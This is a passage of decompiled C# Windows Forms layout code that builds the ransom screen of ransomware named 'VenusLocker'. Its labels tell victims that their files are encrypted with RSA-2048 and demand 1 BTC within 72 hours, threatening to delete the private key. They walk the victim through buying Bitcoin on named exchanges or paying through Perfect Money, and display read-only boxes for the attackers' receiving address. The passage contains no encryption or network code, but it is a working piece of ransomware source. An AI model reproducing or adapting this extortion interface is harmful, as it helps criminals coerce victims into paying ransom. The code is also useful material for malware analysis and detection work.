		((Control)label10).set_Name("label10");
		((Control)label10).set_RightToLeft((RightToLeft)0);
		((Control)label10).set_Size(new Size(770, 22));
		((Control)label10).set_TabIndex(17);
		((Control)label10).set_Text("to complete your payment. If your peyment do not be completed within time limit, your private key will be deleted");
		((Control)label9).set_Font(new Font("Arial", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label9).set_ForeColor(Color.Gold);
		((Control)label9).set_Location(new Point(10, 196));
		((Control)label9).set_Name("label9");
		((Control)label9).set_RightToLeft((RightToLeft)0);
		((Control)label9).set_Size(new Size(139, 22));
		((Control)label9).set_TabIndex(16);
		((Control)label9).set_Text("ONLY 72 hours");
		((Control)label8).set_Font(new Font("Arial", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label8).set_ForeColor(SystemColors.Control);
		((Control)label8).set_Location(new Point(487, 175));
		((Control)label8).set_Name("label8");
		((Control)label8).set_RightToLeft((RightToLeft)0);
		((Control)label8).set_Size(new Size(425, 22));
		((Control)label8).set_TabIndex(15);
		((Control)label8).set_Text("for the private key and decryption service. Note that you have");
		((Control)label7).set_Font(new Font("Arial", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label7).set_ForeColor(Color.Gold);
		((Control)label7).set_Location(new Point(352, 173));
		((Control)label7).set_Name("label7");
		((Control)label7).set_RightToLeft((RightToLeft)0);
		((Control)label7).set_Size(new Size(140, 22));
		((Control)label7).set_TabIndex(14);
		((Control)label7).set_Text("1 BTC (Bitcoin)");
		((Control)label6).set_Font(new Font("Arial", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label6).set_ForeColor(SystemColors.Control);
		((Control)label6).set_Location(new Point(10, 174));
		((Control)label6).set_Name("label6");
		((Control)label6).set_RightToLeft((RightToLeft)0);
		((Control)label6).set_Size(new Size(345, 22));
		((Control)label6).set_TabIndex(13);
		((Control)label6).set_Text("To decrypt and recover your files, you have to pay");
		((Control)label5).set_Font(new Font("Arial", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label5).set_ForeColor(SystemColors.Control);
		((Control)label5).set_Location(new Point(10, 107));
		((Control)label5).set_Name("label5");
		((Control)label5).set_RightToLeft((RightToLeft)0);
		((Control)label5).set_Size(new Size(901, 22));
		((Control)label5).set_TabIndex(12);
		((Control)label5).set_Text("private key is stored on our secret Internet server. And there is no doubt that no one can recover your files without your private key.");
		((Control)label4).set_Font(new Font("Arial", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label4).set_ForeColor(SystemColors.Control);
		((Control)label4).set_Location(new Point(10, 85));
		((Control)label4).set_Name("label4");
		((Control)label4).set_RightToLeft((RightToLeft)0);
		((Control)label4).set_Size(new Size(901, 22));
		((Control)label4).set_TabIndex(11);
		((Control)label4).set_Text("key was used to encrypt your files a moment ago. The private key is necessary for you to decrypt and recover your files. Now, your");
		((Control)label3).set_Font(new Font("Arial", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_ForeColor(SystemColors.Control);
		((Control)label3).set_Location(new Point(10, 63));
		((Control)label3).set_Name("label3");
		((Control)label3).set_RightToLeft((RightToLeft)0);
		((Control)label3).set_Size(new Size(901, 22));
		((Control)label3).set_TabIndex(10);
		((Control)label3).set_Text("RSA-2048, a strong encryption algorithm. RSA algorithm generates a public key and a private key for your computer. The public\r\n");
		((Control)label2).set_Font(new Font("Arial", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_ForeColor(SystemColors.Control);
		((Control)label2).set_Location(new Point(10, 41));
		((Control)label2).set_Name("label2");
		((Control)label2).set_RightToLeft((RightToLeft)0);
		((Control)label2).set_Size(new Size(901, 22));
		((Control)label2).set_TabIndex(9);
		((Control)label2).set_Text("Your personal files, including your photos, documents, videos and other important files on this computer, have been encrypted with");
		HowToPayLabel.set_FlatStyle((FlatStyle)0);
		((Control)HowToPayLabel).set_Font(new Font("Arial", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)HowToPayLabel).set_ForeColor(SystemColors.Info);
		((Control)HowToPayLabel).set_Location(new Point(5, 280));
		((Control)HowToPayLabel).set_Name("HowToPayLabel");
		((Control)HowToPayLabel).set_Size(new Size(266, 25));
		((Control)HowToPayLabel).set_TabIndex(7);
		((Control)HowToPayLabel).set_Text("How to pay for my private key");
		HowToDecryptLabel.set_FlatStyle((FlatStyle)0);
		((Control)HowToDecryptLabel).set_Font(new Font("Arial", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)HowToDecryptLabel).set_ForeColor(SystemColors.Info);
		((Control)HowToDecryptLabel).set_Location(new Point(5, 147));
		((Control)HowToDecryptLabel).set_Name("HowToDecryptLabel");
		((Control)HowToDecryptLabel).set_Size(new Size(240, 25));
		((Control)HowToDecryptLabel).set_TabIndex(5);
		((Control)HowToDecryptLabel).set_Text("How to decrypt my files");
		WhatHappenLabel.set_FlatStyle((FlatStyle)0);
		((Control)WhatHappenLabel).set_Font(new Font("Arial", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)WhatHappenLabel).set_ForeColor(SystemColors.Info);
		((Control)WhatHappenLabel).set_Location(new Point(5, 16));
		((Control)WhatHappenLabel).set_Name("WhatHappenLabel");
		((Control)WhatHappenLabel).set_Size(new Size(240, 25));
		((Control)WhatHappenLabel).set_TabIndex(3);
		((Control)WhatHappenLabel).set_Text("What happened to my files\r\n");
		((Control)tabPage2).set_BackColor(Color.Black);
		((Control)tabPage2).get_Controls().Add((Control)(object)label35);
		((Control)tabPage2).get_Controls().Add((Control)(object)label39);
		((Control)tabPage2).get_Controls().Add((Control)(object)tabControl2);
		((Control)tabPage2).get_Controls().Add((Control)(object)label28);
		((Control)tabPage2).get_Controls().Add((Control)(object)GetStartLinkLabel);
		((Control)tabPage2).get_Controls().Add((Control)(object)BTCHomeLinkLabel);
		((Control)tabPage2).get_Controls().Add((Control)(object)label27);
		((Control)tabPage2).get_Controls().Add((Control)(object)label26);
		((Control)tabPage2).get_Controls().Add((Control)(object)label25);
		((Control)tabPage2).get_Controls().Add((Control)(object)label24);
		((Control)tabPage2).get_Controls().Add((Control)(object)label23);
		((Control)tabPage2).get_Controls().Add((Control)(object)pictureBox1);
		tabPage2.set_Location(new Point(4, 31));
		((Control)tabPage2).set_Name("tabPage2");
		((Control)tabPage2).set_Padding(new Padding(3));
		((Control)tabPage2).set_Size(new Size(925, 638));
		tabPage2.set_TabIndex(1);
		((Control)tabPage2).set_Text("Payment");
		((Control)label35).set_Font(new Font("Arial", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label35).set_ForeColor(SystemColors.Control);
		((Control)label35).set_Location(new Point(10, 260));
		((Control)label35).set_Name("label35");
		((Control)label35).set_RightToLeft((RightToLeft)0);
		((Control)label35).set_Size(new Size(185, 22));
		((Control)label35).set_TabIndex(36);
		((Control)label35).set_Text("convenient for you.");
		((Control)label39).set_Font(new Font("Arial", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label39).set_ForeColor(SystemColors.Control);
		((Control)label39).set_Location(new Point(10, 237));
		((Control)label39).set_Name("label39");
		((Control)label39).set_RightToLeft((RightToLeft)0);
		((Control)label39).set_Size(new Size(901, 22));
		((Control)label39).set_TabIndex(35);
		((Control)label39).set_Text("You can make a payment with Bitcoin based on Bitcoin Wallet or Based on Perfect Money. You can choose the way that is more");
		((Control)tabControl2).get_Controls().Add((Control)(object)tabPage3);
		((Control)tabControl2).get_Controls().Add((Control)(object)tabPage4);
		((Control)tabControl2).set_Location(new Point(3, 290));
		((Control)tabControl2).set_Name("tabControl2");
		tabControl2.set_SelectedIndex(0);
		((Control)tabControl2).set_Size(new Size(919, 345));
		((Control)tabControl2).set_TabIndex(34);
		((Control)tabPage3).set_BackColor(Color.Black);
		((Control)tabPage3).get_Controls().Add((Control)(object)label29);
		((Control)tabPage3).get_Controls().Add((Control)(object)label19);
		((Control)tabPage3).get_Controls().Add((Control)(object)BlockChainlinkLabel);
		((Control)tabPage3).get_Controls().Add((Control)(object)BTCAddressTextBox2);
		((Control)tabPage3).get_Controls().Add((Control)(object)label30);
		((Control)tabPage3).get_Controls().Add((Control)(object)label37);
		((Control)tabPage3).get_Controls().Add((Control)(object)LocalBitcoinslinkLabel);
		((Control)tabPage3).get_Controls().Add((Control)(object)label36);
		((Control)tabPage3).get_Controls().Add((Control)(object)CoinCafelinkLabel);
		((Control)tabPage3).get_Controls().Add((Control)(object)BTCDirectlinkLabel);
		((Control)tabPage3).get_Controls().Add((Control)(object)label34);
		((Control)tabPage3).get_Controls().Add((Control)(object)CEXlinkLabel);
		((Control)tabPage3).get_Controls().Add((Control)(object)label33);
		((Control)tabPage3).get_Controls().Add((Control)(object)label32);
		((Control)tabPage3).get_Controls().Add((Control)(object)HowToBuylinkLabel);
		((Control)tabPage3).get_Controls().Add((Control)(object)label31);
		tabPage3.set_Location(new Point(4, 31));
		((Control)tabPage3).set_Name("tabPage3");
		((Control)tabPage3).set_Padding(new Padding(3));
		((Control)tabPage3).set_Size(new Size(911, 310));
		tabPage3.set_TabIndex(0);
		((Control)tabPage3).set_Text("Based on Bitcoin Wallet");
		((Control)label29).set_Font(new Font("Arial", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label29).set_ForeColor(SystemColors.Control);
		((Control)label29).set_Location(new Point(11, 13));
		((Control)label29).set_Name("label29");
		((Control)label29).set_RightToLeft((RightToLeft)0);
		((Control)label29).set_Size(new Size(305, 22));
		((Control)label29).set_TabIndex(16);
		((Control)label29).set_Text("1. Create a Bitcoin Wallet. We recommend");
		((Control)label19).set_Font(new Font("Arial", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label19).set_ForeColor(SystemColors.Control);
		((Control)label19).set_Location(new Point(11, 278));
		((Control)label19).set_Name("label19");
		((Control)label19).set_RightToLeft((RightToLeft)0);
		((Control)label19).set_Size(new Size(855, 22));
		((Control)label19).set_TabIndex(33);
		((Control)label19).set_Text("4. As mentioned in previous Tab, and then, send us your personal ID via email, you will receive your private key soon.");
		((Control)BlockChainlinkLabel).set_AutoSize(true);
		BlockChainlinkLabel.set_LinkColor(Color.Peru);
		((Control)BlockChainlinkLabel).set_Location(new Point(313, 10));
		((Control)BlockChainlinkLabel).set_Name("BlockChainlinkLabel");
		((Control)BlockChainlinkLabel).set_Size(new Size(137, 22));
		((Control)BlockChainlinkLabel).set_TabIndex(17);
		((Label)BlockChainlinkLabel).set_TabStop(true);
		((Control)BlockChainlinkLabel).set_Text("Blockchain.info");
		BlockChainlinkLabel.add_LinkClicked(new LinkLabelLinkClickedEventHandler(BlockChainlinkLabel_LinkClicked));
		((Control)BTCAddressTextBox2).set_BackColor(SystemColors.WindowText);
		((Control)BTCAddressTextBox2).set_Font(new Font("Arial", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)BTCAddressTextBox2).set_ForeColor(Color.Gold);
		((Control)BTCAddressTextBox2).set_Location(new Point(190, 239));
		((Control)BTCAddressTextBox2).set_Name("BTCAddressTextBox2");
		((TextBoxBase)BTCAddressTextBox2).set_ReadOnly(true);
		((Control)BTCAddressTextBox2).set_Size(new Size(430, 29));
		((Control)BTCAddressTextBox2).set_TabIndex(32);
		((Control)label30).set_Font(new Font("Arial", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label30).set_ForeColor(SystemColors.Control);
		((Control)label30).set_Location(new Point(11, 45));
		((Control)label30).set_Name("label30");
		((Control)label30).set_RightToLeft((RightToLeft)0);
		((Control)label30).set_Size(new Size(540, 22));
		((Control)label30).set_TabIndex(18);
		((Control)label30).set_Text("2. Buy necessary amount of Bitcoins. Our recommendations are as follows.");
		((Control)label37).set_Font(new Font("Arial", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label37).set_ForeColor(SystemColors.Control);
		((Control)label37).set_Location(new Point(11, 210));
		((Control)label37).set_Name("label37");
		((Control)label37).set_RightToLeft((RightToLeft)0);
		((Control)label37).set_Size(new Size(855, 22));
		((Control)label37).set_TabIndex(31);
		((Control)label37).set_Text("3. As mentioned in previous Tab, send about 1 BTC to our Bitcoin receiving address");
		((Control)LocalBitcoinslinkLabel).set_AutoSize(true);
		LocalBitcoinslinkLabel.set_LinkColor(Color.Peru);
		((Control)LocalBitcoinslinkLabel).set_Location(new Point(31, 70));
		((Control)LocalBitcoinslinkLabel).set_Name("LocalBitcoinslinkLabel");
		((Control)LocalBitcoinslinkLabel).set_Size(new Size(165, 22));
		((Control)LocalBitcoinslinkLabel).set_TabIndex(19);
		((Label)LocalBitcoinslinkLabel).set_TabStop(true);
		((Control)LocalBitcoinslinkLabel).set_Text("LocalBitcoins.com");
		LocalBitcoinslinkLabel.add_LinkClicked(new LinkLabelLinkClickedEventHandler(LocalBitcoinslinkLabel_LinkClicked));
		((Control)label36).set_Font(new Font("Arial", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label36).set_ForeColor(SystemColors.Control);
		((Control)label36).set_Location(new Point(236, 177));
		((Control)label36).set_Name("label36");
		((Control)label36).set_RightToLeft((RightToLeft)0);
		((Control)label36).set_Size(new Size(513, 22));
		((Control)label36).set_TabIndex(30);
		((Control)label36).set_Text("-- discover quickly how to buy and sell Bitcoins in your local currency.");
		((Control)CoinCafelinkLabel).set_AutoSize(true);
		CoinCafelinkLabel.set_LinkColor(Color.Peru);
		((Control)CoinCafelinkLabel).set_Location(new Point(31, 95));
		((Control)CoinCafelinkLabel).set_Name("CoinCafelinkLabel");
		((Control)CoinCafelinkLabel).set_Size(new Size(132, 22));
		((Control)CoinCafelinkLabel).set_TabIndex(20);
		((Label)CoinCafelinkLabel).set_TabStop(true);
		((Control)CoinCafelinkLabel).set_Text("CoinCafe.com");
		CoinCafelinkLabel.add_LinkClicked(new LinkLabelLinkClickedEventHandler(CoinCafelinkLabel_LinkClicked));
		((Control)BTCDirectlinkLabel).set_AutoSize(true);
		BTCDirectlinkLabel.set_LinkColor(Color.Peru);
		((Control)BTCDirectlinkLabel).set_Location(new Point(31, 122));
		((Control)BTCDirectlinkLabel).set_Name("BTCDirectlinkLabel");
		((Control)BTCDirectlinkLabel).set_Size(new Size(125, 22));
		((Control)BTCDirectlinkLabel).set_TabIndex(21);
		((Label)BTCDirectlinkLabel).set_TabStop(true);
		((Control)BTCDirectlinkLabel).set_Text("BTCDirect.eu");
		BTCDirectlinkLabel.add_LinkClicked(new LinkLabelLinkClickedEventHandler(BTCDirectlinkLabel_LinkClicked));
		((Control)label34).set_Font(new Font("Arial", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label34).set_ForeColor(SystemColors.Control);
		((Control)label34).set_Location(new Point(108, 150));
		((Control)label34).set_Name("label34");
		((Control)label34).set_RightToLeft((RightToLeft)0);
		((Control)label34).set_Size(new Size(454, 22));
		((Control)label34).set_TabIndex(28);
		((Control)label34).set_Text("-- Visa / MasterCard.");
		((Control)CEXlinkLabel).set_AutoSize(true);
		CEXlinkLabel.set_LinkColor(Color.Peru);
		((Control)CEXlinkLabel).set_Location(new Point(31, 148));
		((Control)CEXlinkLabel).set_Name("CEXlinkLabel");
		((Control)CEXlinkLabel).set_Size(new Size(76, 22));
		((Control)CEXlinkLabel).set_TabIndex(22);
		((Label)CEXlinkLabel).set_TabStop(true);
		((Control)CEXlinkLabel).set_Text("CEX.IO");
		CEXlinkLabel.add_LinkClicked(new LinkLabelLinkClickedEventHandler(CEXlinkLabel_LinkClicked));
		((Control)label33).set_Font(new Font("Arial", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label33).set_ForeColor(SystemColors.Control);
		((Control)label33).set_Location(new Point(157, 123));
		((Control)label33).set_Name("label33");
		((Control)label33).set_RightToLeft((RightToLeft)0);
		((Control)label33).set_Size(new Size(217, 22));
		((Control)label33).set_TabIndex(27);
		((Control)label33).set_Text("-- the best for Europe.");
		((Control)label32).set_Font(new Font("Arial", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label32).set_ForeColor(SystemColors.Control);
		((Control)label32).set_Location(new Point(164, 97));
		((Control)label32).set_Name("label32");
		((Control)label32).set_RightToLeft((RightToLeft)0);
		((Control)label32).set_Size(new Size(454, 22));
		((Control)label32).set_TabIndex(26);
		((Control)label32).set_Text("-- the simplest and fastest way to buy, sell and use Bitcoins.");
		((Control)HowToBuylinkLabel).set_AutoSize(true);
		HowToBuylinkLabel.set_LinkColor(Color.Peru);
		((Control)HowToBuylinkLabel).set_Location(new Point(31, 175));
		((Control)HowToBuylinkLabel).set_Name("HowToBuylinkLabel");
		((Control)HowToBuylinkLabel).set_Size(new Size(203, 22));
		((Control)HowToBuylinkLabel).set_TabIndex(24);
		((Label)HowToBuylinkLabel).set_TabStop(true);
		((Control)HowToBuylinkLabel).set_Text("HowToBuyBitcoins.info");
		HowToBuylinkLabel.add_LinkClicked(new LinkLabelLinkClickedEventHandler(HowToBuylinkLabel_LinkClicked));
		((Control)label31).set_Font(new Font("Arial", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label31).set_ForeColor(SystemColors.Control);
		((Control)label31).set_Location(new Point(197, 73));
		((Control)label31).set_Name("label31");
		((Control)label31).set_RightToLeft((RightToLeft)0);
		((Control)label31).set_Size(new Size(454, 22));
		((Control)label31).set_TabIndex(25);
		((Control)label31).set_Text("-- the fastest and easiest way to buy and sell Bitcoins.");
		((Control)tabPage4).set_BackColor(Color.Black);
		((Control)tabPage4).get_Controls().Add((Control)(object)label46);
		((Control)tabPage4).get_Controls().Add((Control)(object)BTCAddressTextBox3);
		((Control)tabPage4).get_Controls().Add((Control)(object)label45);
		((Control)tabPage4).get_Controls().Add((Control)(object)label44);
		((Control)tabPage4).get_Controls().Add((Control)(object)label43);
		((Control)tabPage4).get_Controls().Add((Control)(object)label42);
		((Control)tabPage4).get_Controls().Add((Control)(object)PMBitcoinLinkLabel);
		((Control)tabPage4).get_Controls().Add((Control)(object)label40);
		((Control)tabPage4).get_Controls().Add((Control)(object)PerfectMoneyLinkLabel);
		((Control)tabPage4).get_Controls().Add((Control)(object)label41);
		tabPage4.set_Location(new Point(4, 31));
		((Control)tabPage4).set_Name("tabPage4");
		((Control)tabPage4).set_Padding(new Padding(3));
		((Control)tabPage4).set_Size(new Size(911, 310));
		tabPage4.set_TabIndex(1);
		((Control)tabPage4).set_Text("Base on Perfect Money");
		((Control)label46).set_Font(new Font("Arial", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label46).set_ForeColor(SystemColors.Control);
		((Control)label46).set_Location(new Point(696, 79));
		((Control)label46).set_Name("label46");
		((Control)label46).set_RightToLeft((RightToLeft)0);
		((Control)label46).set_Size(new Size(212, 22));
		((Control)label46).set_TabIndex(41);
		((Control)label46).set_Text("in the \"Bitcoin Wallet\" textbox.");
		((Control)BTCAddressTextBox3).set_BackColor(SystemColors.WindowText);
		((Control)BTCAddressTextBox3).set_Font(new Font("Arial", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)BTCAddressTextBox3).set_ForeColor(Color.Gold);
		((Control)BTCAddressTextBox3).set_Location(new Point(293, 74));
		((Control)BTCAddressTextBox3).set_Name("BTCAddressTextBox3");
		((TextBoxBase)BTCAddressTextBox3).set_ReadOnly(true);
		((Control)BTCAddressTextBox3).set_Size(new Size(400, 29));
		((Control)BTCAddressTextBox3).set_TabIndex(40);
		((Control)label45).set_Font(new Font("Arial", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label45).set_ForeColor(SystemColors.Control);
		((Control)label45).set_Location(new Point(11, 177));
		((Control)label45).set_Name("label45");
		((Control)label45).set_RightToLeft((RightToLeft)0);
		((Control)label45).set_Size(new Size(855, 22));
		((Control)label45).set_TabIndex(39);
		((Control)label45).set_Text("3. As mentioned in previous Tab, and then, send us your personal ID via email, you will receive your private key soon.");
		((Control)label44).set_Font(new Font("Arial", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label44).set_ForeColor(SystemColors.Control);
		((Control)label44).set_Location(new Point(30, 140));
		((Control)label44).set_Name("label44");
		((Control)label44).set_RightToLeft((RightToLeft)0);
		((Control)label44).set_Size(new Size(814, 22));
		((Control)label44).set_TabIndex(38);
		((Control)label44).set_Text("c. click \"PAY\" button, then you can complete you payment with your Perfect Money account and local debit card.");
		((Control)label43).set_Font(new Font("Arial", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label43).set_ForeColor(SystemColors.Control);
		((Control)label43).set_Location(new Point(30, 113));
		((Control)label43).set_Name("label43");
		((Control)label43).set_RightToLeft((RightToLeft)0);
		((Control)label43).set_Size(new Size(636, 22));
		((Control)label43).set_TabIndex(37);
		((Control)label43).set_Text("b. input 1 in the \"BTC\" textbox, the amount of USD will be calculated automatically.");
		((Control)label42).set_Font(new Font("Arial", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label42).set_ForeColor(SystemColors.Control);
		((Control)label42).set_Location(new Point(30, 80));
		((Control)label42).set_Name("label42");
		((Control)label42).set_RightToLeft((RightToLeft)0);
		((Control)label42).set_Size(new Size(265, 22));
		((Control)label42).set_TabIndex(36);
		((Control)label42).set_Text("a. input our Bitcoin receiving address");
		((Control)PMBitcoinLinkLabel).set_AutoSize(true);
		PMBitcoinLinkLabel.set_LinkColor(Color.Peru);
		((Control)PMBitcoinLinkLabel).set_Location(new Point(86, 46));
		((Control)PMBitcoinLinkLabel).set_Name("PMBitcoinLinkLabel");
		((Control)PMBitcoinLinkLabel).set_Size(new Size(137, 22));
		((Control)PMBitcoinLinkLabel).set_TabIndex(22);
		((Label)PMBitcoinLinkLabel).set_TabStop(true);
		((Control)PMBitcoinLinkLabel).set_Text("PMBitcoin.com");
		PMBitcoinLinkLabel.add_LinkClicked(new LinkLabelLinkClickedEventHandler(PMBitcoinLinkLabel_LinkClicked));
		((Control)label40).set_Font(new Font("Arial", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label40).set_ForeColor(SystemColors.Control);
		((Control)label40).set_Location(new Point(11, 13));
		((Control)label40).set_Name("label40");
		((Control)label40).set_RightToLeft((RightToLeft)0);
		((Control)label40).set_Size(new Size(252, 22));
		((Control)label40).set_TabIndex(19);
		((Control)label40).set_Text("1. Create a Perfect Money account.");
		((Control)PerfectMoneyLinkLabel).set_AutoSize(true);
		PerfectMoneyLinkLabel.set_LinkColor(Color.Peru);
		((Control)PerfectMoneyLinkLabel).set_Location(new Point(265, 10));
		((Control)PerfectMoneyLinkLabel).set_Name("PerfectMoneyLinkLabel");
		((Control)PerfectMoneyLinkLabel).set_Size(new Size(133, 22));
		((Control)PerfectMoneyLinkLabel).set_TabIndex(20);
		((Label)PerfectMoneyLinkLabel).set_TabStop(true);
		((Control)PerfectMoneyLinkLabel).set_Text("Perfect Money");
		PerfectMoneyLinkLabel.add_LinkClicked(new LinkLabelLinkClickedEventHandler(PerfectMoneyLinkLabel_LinkClicked));
		((Control)label41).set_Font(new Font("Arial", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label41).set_ForeColor(SystemColors.Control);
		((Control)label41).set_Location(new Point(11, 49));
		((Control)label41).set_Name("label41");
		((Control)label41).set_RightToLeft((RightToLeft)0);
		((Control)label41).set_Size(new Size(75, 22));
		((Control)label41).set_TabIndex(21);
		((Control)label41).set_Text("2. Visit to");
		label28.set_FlatStyle((FlatStyle)0);
		((Control)label28).set_Font(new Font("Arial", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label28).set_ForeColor(SystemColors.Info);
		((Control)label28).set_Location(new Point(5, 209));
		((Control)label28).set_Name("label28");
		((Control)label28).set_Size(new Size(331, 25));
		((Control)label28).set_TabIndex(15);
		((Control)label28).set_Text("How to make a payment with Bitcoin");
		((Control)GetStartLinkLabel).set_AutoSize(true);
		GetStartLinkLabel.set_LinkColor(Color.Peru);
		((Control)GetStartLinkLabel).set_Location(new Point(130, 170));
		((Control)GetStartLinkLabel).set_Name("GetStartLinkLabel");
		((Control)GetStartLinkLabel).set_Size(new Size(206, 22));
		((Control)GetStartLinkLabel).set_TabIndex(14);
		((Label)GetStartLinkLabel).set_TabStop(true);
		((Control)GetStartLinkLabel).set_Text("Get Started with Bitcoin");
		GetStartLinkLabel.add_LinkClicked(new LinkLabelLinkClickedEventHandler(GetStartLinkLabel_LinkClicked));
		((Control)BTCHomeLinkLabel).set_AutoSize(true);
		BTCHomeLinkLabel.set_LinkColor(Color.Peru);
		((Control)BTCHomeLinkLabel).set_Location(new Point(10, 170));
		((Control)BTCHomeLinkLabel).set_Name("BTCHomeLinkLabel");
		((Control)BTCHomeLinkLabel).set_Size(new Size(106, 22));
		((Control)BTCHomeLinkLabel).set_TabIndex(13);
		((Label)BTCHomeLinkLabel).set_TabStop(true);
		((Control)BTCHomeLinkLabel).set_Text("HomePage");
		BTCHomeLinkLabel.add_LinkClicked(new LinkLabelLinkClickedEventHandler(HomePage_LinkClicked));
		((Control)label27).set_Font(new Font("Arial", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label27).set_ForeColor(SystemColors.Control);
		((Control)label27).set_Location(new Point(10, 147));
		((Control)label27).set_Name("label27");
		((Control)label27).set_RightToLeft((RightToLeft)0);
		((Control)label27).set_Size(new Size(149, 22));
		((Control)label27).set_TabIndex(12);
		((Control)label27).set_Text("financial institution.");
		((Control)label26).set_Font(new Font("Arial", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label26).set_ForeColor(SystemColors.Control);
		((Control)label26).set_Location(new Point(10, 125));
		((Control)label26).set_Name("label26");
		((Control)label26).set_RightToLeft((RightToLeft)0);
		((Control)label26).set_Size(new Size(901, 22));
		((Control)label26).set_TabIndex(11);
		((Control)label26).set_Text("independent of any central authority. Bitcoins can be transferred through a computer or a smartphone withour an intermediate");
		((Control)label25).set_Font(new Font("Arial", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label25).set_ForeColor(SystemColors.Control);
		((Control)label25).set_Location(new Point(10, 103));
		((Control)label25).set_Name("label25");
		((Control)label25).set_RightToLeft((RightToLeft)0);
		((Control)label25).set_Size(new Size(901, 22));
		((Control)label25).set_TabIndex(10);
		((Control)label25).set_Text("Bitcoin is an innovative payment network and a new kind of money.It is based on an open-source cryptographic protocol that is");
		label24.set_FlatStyle((FlatStyle)0);
		((Control)label24).set_Font(new Font("Arial", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label24).set_ForeColor(SystemColors.Info);
		((Control)label24).set_Location(new Point(5, 78));
		((Control)label24).set_Name("label24");
		((Control)label24).set_Size(new Size(154, 25));
		((Control)label24).set_TabIndex(8);
		((Control)label24).set_Text("What is Bitcoin\r\n");
		((Control)label23).set_Font(new Font("Cambria", 42f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)label23).set_ForeColor(Color.Gold);
		((Control)label23).set_Location(new Point(359, 14));
		((Control)label23).set_Name("label23");
		((Control)label23).set_Size(new Size(224, 62));
		((Control)label23).set_TabIndex(7);
		((Control)label23).set_Text("Bitcoin");
		pictureBox1.set_Image((Image)(object)Resources.bitcoin);
		((Control)pictureBox1).set_Location(new Point(283, 10));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(70, 70));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)4);
		pictureBox1.set_TabIndex(0);
		pictureBox1.set_TabStop(false);
		((Control)label13).set_Font(new Font("Arial", 21.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label13).set_ForeColor(Color.Red);
		((Control)label13).set_Location(new Point(46, 54));
		((Control)label13).set_Name("label13");
		((Control)label13).set_Size(new Size(240, 34));
		((Control)label13).set_TabIndex(8);
		((Control)label13).set_Text("Your are hacked");
		LockerPicBox.set_Image((Image)(object)Resources.locker);
		LockerPicBox.set_InitialImage((Image)(object)Resources.locker);
		((Control)LockerPicBox).set_Location(new Point(66, 127));
		((Control)LockerPicBox).set_Name("LockerPicBox");
		((Control)LockerPicBox).set_Size(new Size(180, 180));
		LockerPicBox.set_SizeMode((PictureBoxSizeMode)4);
		LockerPicBox.set_TabIndex(1);
		LockerPicBox.set_TabStop(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 12f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Black);
		((Form)this).set_ClientSize(new Size(1260, 730));
		((Control)this).get_Controls().Add((Control)(object)label13);
		((Control)this).get_Controls().Add((Control)(object)tabControl1);
		((Control)this).get_Controls().Add((Control)(object)TitleLabel);
		((Control)this).get_Controls().Add((Control)(object)TimerLabel);
		((Control)this).get_Controls().Add((Control)(object)TimeLeftLabel);
		((Control)this).get_Controls().Add((Control)(object)DestroyTimeLabel);
		((Control)this).get_Controls().Add((Control)(object)TimeReminderLabel);
		((Control)this).get_Controls().Add((Control)(object)LockerPicBox);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)2);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("MainForm");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("VenusLocker");
		((Form)this).add_FormClosing(new FormClosingEventHandler(FormClosing_Clicked));
		((Form)this).add_Load((EventHandler)MainForm_Load);
		((Control)tabControl1).ResumeLayout(false);
